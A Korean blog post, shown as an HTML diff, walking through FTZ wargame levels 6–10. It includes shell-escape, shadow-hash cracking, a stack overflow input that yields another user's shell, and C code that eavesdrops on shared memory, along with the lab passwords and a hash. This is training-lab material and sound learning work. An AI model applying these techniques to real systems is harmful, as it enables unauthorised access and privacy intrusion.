@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=ko>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Level 6Description인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다. Analyze12345hint - 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.[level6@ftz level6]$ lshint  password  public_html  tmp  tn 로그인하자마자 저 hint가 나올 때 Ctrl + C를">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FTZ : level 6 ~ 10">
+<meta property="og:url" content="https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/index.html">
+<meta property="og:site_name" content="bintab1e">
+<meta property="og:description" content="Level 6Description인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다. Analyze12345hint - 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.[level6@ftz level6]$ lshint  password  public_html  tmp  tn 로그인하자마자 저 hint가 나올 때 Ctrl + C를">
+<meta property="og:locale" content="ko_KR">
+<meta property="article:published_time" content="2024-09-19T07:01:37.000Z">
+<meta property="article:modified_time" content="2024-10-05T08:00:22.137Z">
+<meta property="article:author" content="bintab1e">
+<meta property="article:tag" content="FTZ">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/test.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/test.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/test.png">
+        
+      
+    
+    <!-- title -->
+    <title>FTZ : level 6 ~ 10</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/19/ftz/FTZ-level-1-5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&text=FTZ : level 6 ~ 10"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&is_video=false&description=FTZ : level 6 ~ 10"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FTZ : level 6 ~ 10&body=Check out this article: https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&name=FTZ : level 6 ~ 10&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&t=FTZ : level 6 ~ 10"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6"><span class="toc-number">1.</span> <span class="toc-text">Level 6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7"><span class="toc-number">2.</span> <span class="toc-text">Level 7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-1"><span class="toc-number">2.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-1"><span class="toc-number">2.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8"><span class="toc-number">3.</span> <span class="toc-text">Level 8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-2"><span class="toc-number">3.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-2"><span class="toc-number">3.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9"><span class="toc-number">4.</span> <span class="toc-text">Level 9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-3"><span class="toc-number">4.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-3"><span class="toc-number">4.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-10"><span class="toc-number">5.</span> <span class="toc-text">Level 10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-4"><span class="toc-number">5.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-4"><span class="toc-number">5.2.</span> <span class="toc-text">Analyze</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EA%B3%B5%EC%9C%A0%EB%A9%94%EB%AA%A8%EB%A6%AC"><span class="toc-number">5.2.1.</span> <span class="toc-text">공유메모리</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shmget"><span class="toc-number">5.2.2.</span> <span class="toc-text">shmget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shmat"><span class="toc-number">5.2.3.</span> <span class="toc-text">shmat</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        FTZ : level 6 ~ 10
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">bintab1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-19T07:01:37.000Z" class="dt-published" itemprop="datePublished">2024-09-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pwnable/">pwnable</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/FTZ/" rel="tag">FTZ</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.</p>
+<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hint - 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[level6@ftz level6]$ ls</span><br><span class="line">hint  password  public_html  tmp  tn</span><br></pre></td></tr></table></figure>
+<p>로그인하자마자 저 hint가 나올 때 Ctrl + C를 누르니 프로그램이 종료되고, shell이 바로 떨어진다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[level6@ftz level6]$ cat password</span><br><span class="line">Level7 password is &quot;come together&quot;.</span><br></pre></td></tr></table></figure>
+<p>이후 level6 디렉토리에 있는 password 파일을 읽어 패스워드를 획득할 수 있다.</p>
+<hr>
+<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>&#x2F;bin&#x2F;level7 명령을 실행하면, 패스워드 입력을 요청한다.</p>
+<ol>
+<li>패스워드를 가까운 곳에 ..</li>
+<li>상상력을 총동원하라.</li>
+<li>2진수를 10진수로 바꿀 수 있는가?</li>
+<li>계산기 설정을 공학용으로 바꾸어라</li>
+</ol>
+<h3 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[level7@ftz level7]$ /bin/level7</span><br><span class="line">Insert The Password : 1</span><br><span class="line">--_--_- --____- ---_-__--__-_-</span><br></pre></td></tr></table></figure>
+<p>&#x2F;bin&#x2F;level7을 실행하면 다음과 같은 문자열을 볼 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1101101 &gt; 109 &gt; m</span><br><span class="line">1100001 &gt; 97 &gt; a</span><br><span class="line">1110100 &gt; 116 &gt; t</span><br><span class="line">1100101 &gt; 101 &gt; e</span><br></pre></td></tr></table></figure>
+<p>-를 1로 _를 0으로 치환하여 나오는 2진수를 10진수로 변환하고 ascii 테이블에서 해당하는 문자를 찾아보면, mate라는 단어를 확인할 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[level7@ftz level7]$ /bin/level7</span><br><span class="line">Insert The Password : mate</span><br><span class="line"></span><br><span class="line">Congratulation! next password is &quot;break the world&quot;.</span><br></pre></td></tr></table></figure>
+<p>해당 단어를 &#x2F;bin&#x2F;level7의 비밀번호로 입력하여 다음 레벨의 패스워드를 얻을 수 있다.</p>
+<hr>
+<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>level9의 shadow 파일이 서버 어딘가에 숨어있다.<br>그 파일에 대해 알려진 것은 용량이 “2700”이라는 것 뿐이다.</p>
+<h3 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[level8@ftz level8]$ find / -type f -size 2700c 2&gt;/dev/null</span><br><span class="line">/var/www/manual/ssl/ssl_intro_fig2.gif</span><br><span class="line">/etc/rc.d/found.txt</span><br><span class="line">/usr/share/man/man3/IO::Pipe.3pm.gz</span><br><span class="line">/usr/share/man/man3/URI::data.3pm.gz</span><br></pre></td></tr></table></figure>
+<p>다음 find 명령어를 보내면, 다음과 같이 의심스러운 found.txt 파일을 확인할 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[level8@ftz level8]$ cat /etc/rc.d/found.txt</span><br><span class="line">level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524</span><br></pre></td></tr></table></figure>
+<p>found.txt 파일을 읽어보면, level9의 shadow 파일 내용을 볼 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple</span><br></pre></td></tr></table></figure>
+<p>john the ripper로 $1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps. 이 내용을 해석해보면, apple이란 단어가 나온다. 여기서 어째야지? 했는데, level9의 패스워드가 apple이었다,,</p>
+<hr>
+<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>다음은 &#x2F;usr&#x2F;bin&#x2F;bof의 소스이다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main() &#123;</span><br><span class="line">	<span class="type">char</span> buf2[<span class="number">10</span>];</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It can be overflow : &quot;</span>);</span><br><span class="line">	fgets(buf,<span class="number">40</span>,<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strncmp</span>(buf2, <span class="string">&quot;go&quot;</span>, <span class="number">2</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Good Skill!\n&quot;</span>);</span><br><span class="line">		setreuid(<span class="number">3010</span>, <span class="number">3010</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>이를 이용하여 level10의 권한을 얻어라</p>
+<h3 id="Analyze-3"><a href="#Analyze-3" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf2[<span class="number">10</span>]</span><br><span class="line"><span class="type">char</span> buf[<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">fgets(buf, <span class="number">40</span>, <span class="built_in">stdin</span>)</span><br></pre></td></tr></table></figure>
+<p>buf 변수의 크기는 10 바이트이나, fgets에서 40바이트 만큼의 입력을 받으므로 bof가 가능하다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(strncmp(buf2, &quot;go&quot;, 2) == 0)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Good Skill!\n&quot;);</span><br><span class="line">	setreuid(3010, 3010);</span><br><span class="line">	system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>조건문을 확인해 보면, buf2 변수의 값이 go인 경우 쉘을 준다.<br>즉, bof를 통해 buf 변수를 넘어 buf2 의 값을 go로 변경해 주면 쉘을 획득할 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	buf2[10]</span><br><span class="line"></span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">	buf[10]</span><br><span class="line"></span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">	반환 주소</span><br></pre></td></tr></table></figure>
+<p>지역변수는 선언된 순서에 따라 스택 메모리에 저장되는데, buf2가 먼저 선언되었으므로, LIFO에 따라 위와 같이 스택프레임이 구성된다.</p>
+<p>buf 변수에 10 바이트를 초과하는 입력을 할 경우 buf 영역을 넘어 buf2의 메모리 영역까지 덮어쓰게된다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[level9@ftz tmp]$ gdb -q bof</span><br><span class="line">(gdb) set disassembly-flavor intel</span><br><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048420 &lt;main+0&gt;:    push   ebp</span><br><span class="line">0x08048421 &lt;main+1&gt;:    mov    ebp,esp</span><br><span class="line">0x08048423 &lt;main+3&gt;:    sub    esp,0x28</span><br><span class="line">0x08048426 &lt;main+6&gt;:    and    esp,0xfffffff0</span><br><span class="line">0x08048429 &lt;main+9&gt;:    mov    eax,0x0</span><br><span class="line">0x0804842e &lt;main+14&gt;:   sub    esp,eax</span><br><span class="line">0x08048430 &lt;main+16&gt;:   sub    esp,0xc</span><br><span class="line">0x08048433 &lt;main+19&gt;:   push   0x8048554</span><br><span class="line">0x08048438 &lt;main+24&gt;:   call   0x8048350 &lt;printf&gt;</span><br><span class="line">0x0804843d &lt;main+29&gt;:   add    esp,0x10</span><br><span class="line">0x08048440 &lt;main+32&gt;:   sub    esp,0x4</span><br><span class="line">0x08048443 &lt;main+35&gt;:   push   ds:0x8049698</span><br><span class="line">0x08048449 &lt;main+41&gt;:   push   0x28</span><br><span class="line">0x0804844b &lt;main+43&gt;:   lea    eax,[ebp-40] &lt;&lt;&lt; buf</span><br><span class="line">0x0804844e &lt;main+46&gt;:   push   eax</span><br><span class="line">0x0804844f &lt;main+47&gt;:   call   0x8048320 &lt;fgets&gt;</span><br><span class="line">0x08048454 &lt;main+52&gt;:   add    esp,0x10</span><br><span class="line">0x08048457 &lt;main+55&gt;:   sub    esp,0x4</span><br><span class="line">0x0804845a &lt;main+58&gt;:   push   0x2</span><br><span class="line">0x0804845c &lt;main+60&gt;:   push   0x8048569</span><br><span class="line">0x08048461 &lt;main+65&gt;:   lea    eax,[ebp-24] &lt;&lt;&lt; buf2</span><br><span class="line">0x08048464 &lt;main+68&gt;:   push   eax</span><br><span class="line">0x08048465 &lt;main+69&gt;:   call   0x8048330 &lt;strncmp&gt;</span><br></pre></td></tr></table></figure>
+<p>gdb를 통해 main 함수를 disassemble 해보면, buf의 시작지점은 [ebp-40]이고, buf2의 시작지점은 [ebp-24]로, 16바이트의 차이가 나는 것을 볼 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[level9@ftz tmp]$ /usr/bin/bof</span><br><span class="line">It can be overflow : aaaaaaaaaaaaaaaago</span><br><span class="line">Good Skill!</span><br><span class="line">[level10@ftz tmp]$ my-pass</span><br><span class="line">Level10 Password is &quot;interesting to hack!&quot;.</span><br></pre></td></tr></table></figure>
+<p>따라서, &#x2F;usr&#x2F;bin&#x2F;bof를 실행하고 16바이트만큼 입력 후 go 문자열을 보내주면 buf2의 메모리 영역이 go로 덮이게 되어 level10의 쉘을 획득할 수 있다.</p>
+<hr>
+<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><p>두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.<br>그 대화방은 공유 메모리를 이용하여 만들어졌으며,<br>key_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여<br>level11의 권한을 얻어라.</p>
+<ul>
+<li>레벨을 완료하셨다면 소스는 지우고 나가주세요.</li>
+</ul>
+<h3 id="Analyze-4"><a href="#Analyze-4" class="headerlink" title="Analyze"></a>Analyze</h3><h4 id="공유메모리"><a href="#공유메모리" class="headerlink" title="공유메모리"></a>공유메모리</h4><p>일반적으로 프로세스에게 할당된 메모리 영역은 해당 프로세스만 사용한다. 이와는 다르게 공유 메모리는 여러 프로세스가 동시에 접근할 수 있는 메모리 영역으로, 위 메모리 영역을 통해 데이터 공유나, 프로세스간 통신을 수행한다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/shm.h&gt;</span><br><span class="line">#include &lt;sys/ipc.h&gt;</span><br></pre></td></tr></table></figure>
+<p>공유 메모리를 제어하기 위해선 위와 같은 헤더 파일을 include 해주어야 한다.</p>
+<h4 id="shmget"><a href="#shmget" class="headerlink" title="shmget"></a>shmget</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int shmget(key_t key, size_t size, int shmflg)</span><br></pre></td></tr></table></figure>
+<p>shmget은 인자로 받은 key 값을 통해 공유 메모리에 접근한다.<br>마지막 shmflg는 IPC_CREAT와 IPC_EXCL 두가지가 존재하는데, CREAT는 새로운 메모리 세그먼트를 생성하고, EXCL은 공유 메모리가 있는지 확인하고 없으면 CREAT로 할당받는다.</p>
+<h4 id="shmat"><a href="#shmat" class="headerlink" title="shmat"></a>shmat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *shmat(int shmid, const void *shmaddr, int shmflg)</span><br></pre></td></tr></table></figure>
+<p>공유 메모리를 획득하면 메모리 위치에 프로세스를 접근시킨다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">key_t</span> key = <span class="number">7530</span>;</span><br><span class="line">	<span class="type">int</span> shm_id;</span><br><span class="line">	<span class="type">char</span> *shm_ptr;</span><br><span class="line"></span><br><span class="line">	shm_id = shmget(key, <span class="number">1024</span>, <span class="number">0666</span>);</span><br><span class="line">	shm_ptr = (<span class="type">char</span> *)shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Read from shared memory: %s\n&quot;</span>, shm_ptr);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	shmdt(shm_ptr);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>확인한 함수를 가지고 공유 메모리를 읽기 위해 다음 코드를 작성해주고 gcc로 컴파일 후 실행해준다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">멍멍 : level11의 패스워드는?</span><br><span class="line">구타 : what!@#$?</span><br></pre></td></tr></table></figure>
+<p>공유 메모리를 읽어 멍멍과 구타가 대화한 내용을 확인할 수 있다.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
